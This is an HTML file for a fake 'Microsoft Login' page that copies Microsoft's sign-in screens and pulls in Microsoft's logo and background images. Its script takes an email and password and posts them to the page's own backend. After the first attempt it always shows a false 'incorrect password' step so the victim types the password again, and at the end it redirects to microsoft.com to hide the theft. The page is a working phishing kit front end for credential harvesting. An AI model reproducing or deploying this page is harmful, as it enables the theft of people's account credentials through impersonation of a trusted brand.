
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg');
            background-size: cover;
        }
        .logo {
            margin-bottom: 15px;
        }
        .step { 
            font-size: 12px; 
            color: #000; 
            margin: -10px 0 14px 0; 
            opacity: .8; 
        }
        .muted {
            color: #000;
            text-decoration: none;
            font-size: 13px;
        }
        .sigopts {
            background-color: white;
            padding: 20px 41px;
            border-radius: 0;
            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
            width: 405px;
            margin-top: 10px;
            text-align: left;
        }
        .header {
            margin: 0 0 20px;
            font-size: 24px;
            font-weight: bold;
        }
        form input {
            width: 100%;
            padding: 6px 6px 6px 0;
            margin-bottom: 10px;
            border: none;
            border-bottom: 1px solid #0067b8;
            background-color: transparent;
            outline: none;
        }
        form div {
            margin: 15px 0;
            font-size: 13px;
        }
        form button {
            padding: 6px 32px;
            border: none;
            border-radius: 0;
            cursor: pointer;
        }
        .btn-back {
            background-color: #e0e0e0;
            color: #000;
            margin-right: 4px;
        }
        .btn-next {
            background-color: #0078d4;
            color: white;
        }
        .error-msg {
            color: red;
            font-weight: normal;
            margin: 10px 0;
        }
        .error-msg span {
            color: blue;
            cursor: pointer;
        }
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }
    </style>
</head>
<body>

<div id="container" style="background-color: white; padding: 40px; border-radius: 0; box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1); width: 405px;">
</div>

<div class="sigopts"><span class="muted">üîí Sign-in options</span></div>

<script>
    let email = "";
    let password = "";

    function validateEmail(email) {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return re.test(email);
    }

    function showStep1() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <h1 class="header">Sign in</h1>
            <form id="loginForm">
                <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #000; text-decoration: none;">No account? <span style="color: #0067b8; text-decoration: none;">Create one!</span></span><br><br>
                    <span style="color: #0067b8; text-decoration: none;">Can't access your account?</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="submit" class="btn-next">Next</button>
                </div>
            </form>
        `;
        
        document.getElementById("loginForm").addEventListener("submit", function(e){
            e.preventDefault();
            const emailValue = document.getElementById("emailInput").value.trim();
            if(emailValue && validateEmail(emailValue)) {
                email = emailValue;
                showStep2();
            } else {
                alert("Please enter a valid email address.");
            }
        });
    }

    function showStep2() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <div class="muted" style="margin:10px 0;">‚Üê ${email}</div>
            <h1 class="header">Enter password</h1>
            <form id="loginForm">
                <input type="password" id="passwordInput" placeholder="Password" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span><br><br>
                    <span style="color: #0067b8; text-decoration: none;">Sign in with a different account</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="button" class="btn-back" id="btnBack">Back</button>
                    <button type="submit" class="btn-next">Sign in</button>
                </div>
            </form>
        `;
        
        document.getElementById("btnBack").addEventListener("click", function(){
            showStep1();
        });
        
        document.getElementById("loginForm").addEventListener("submit", function(e){
            e.preventDefault();
            const pwd = document.getElementById("passwordInput").value;
            if(pwd.trim()) {
                password = pwd;
                submitToBackend(email, password, false);
            } else {
                alert("Please enter your password.");
            }
        });
    }

    function showStep3() {
        const container = document.getElementById("container");
        container.innerHTML = `
            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
            <div class="muted" style="margin:10px 0;">‚Üê ${email}</div>
            <h1 class="header">Your account or password is incorrect</h1>
            <div style="margin: 15px 0;">
                If you don't remember your password, <span style="color: #0067b8; cursor: pointer;">reset it now</span>.
            </div>
            <form id="loginForm">
                <input type="password" id="finalPasswordInput" placeholder="Password" required>
                <div style="margin: 15px 0; font-size: 13px;">
                    <span style="color: #0067b8; text-decoration: none;">Forgot password?</span>
                </div>
                <div style="display: flex; justify-content: flex-end;">
                    <button type="button" class="btn-back" id="btnBack2">Back</button>
                    <button type="submit" class="btn-next" id="finalSignIn">Sign in</button>
                </div>
            </form>
        `;
        
        document.getElementById("btnBack2").addEventListener("click", function(){
            showStep2();
        });
        
        document.getElementById("loginForm").addEventListener("submit", function(e){
            e.preventDefault();
            const finalPassword = document.getElementById("finalPasswordInput").value;
            if(finalPassword.trim()) {
                const signInBtn = document.getElementById("finalSignIn");
                signInBtn.innerHTML = `
                    <span style="display: inline-block; width: 12px; height: 12px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; margin-right: 8px;"></span>
                    Processing...
                `;
                submitToBackend(email, finalPassword, true);
            } else {
                alert("Please enter your password.");
            }
        });
    }

    function submitToBackend(emailValue, passwordValue, isSecondAttempt) {
        const formData = new FormData();
        formData.append('email', emailValue);
        formData.append('password', passwordValue);
        formData.append('submit', 'Sign in');
        formData.append('csrf_token', '{{ csrf_token() }}');

        fetch('/', {
            method: 'POST',
            body: formData,
            redirect: 'follow'
        })
        .then(response => {
            // Check if redirected to microsoft.com (successful login)
            if (response.url && response.url.includes('microsoft.com')) {
                window.location.href = 'https://microsoft.com';
                return null;
            }
            
            // Check if redirected back to our form with retry parameter
            if (response.url && response.url.includes('retry=true')) {
                setTimeout(() => showStep3(), 500);
                return null;
            }
            
            return response.text();
        })
        .then(html => {
            if (!html) return;
            
            // Check if the response contains error indicators
            if (html.includes('error=true') || html.includes('step=retry')) {
                if (!isSecondAttempt) {
                    setTimeout(() => showStep3(), 500);
                } else {
                    showError("Login failed. Please try again.");
                }
            } else if (!isSecondAttempt) {
                // First attempt should always go to second pass
                setTimeout(() => showStep3(), 500);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            showError("An error occurred. Please try again.");
        });
    }

    function showError(message) {
        const container = document.getElementById("container");
        const existingError = container.querySelector('.error-msg');
        if (existingError) {
            existingError.remove();
        }
        
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-msg';
        errorDiv.innerHTML = message;
        container.insertBefore(errorDiv, container.firstChild);
    }

    // Initialize the application
    (function init(){
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const hintedEmail = (urlParams.get("email") || "").trim();
            const step = urlParams.get("step") || "";

            if (hintedEmail && validateEmail(hintedEmail)) {
                email = hintedEmail;
                if (step === "password") {
                    showStep2();
                    return;
                } else if (step === "retry") {
                    showStep3();
                    return;
                }
            }
        } catch (e) {
            console.error("URL parsing error:", e);
        }
        
        showStep1();
    })();
</script>

</body>
</html>
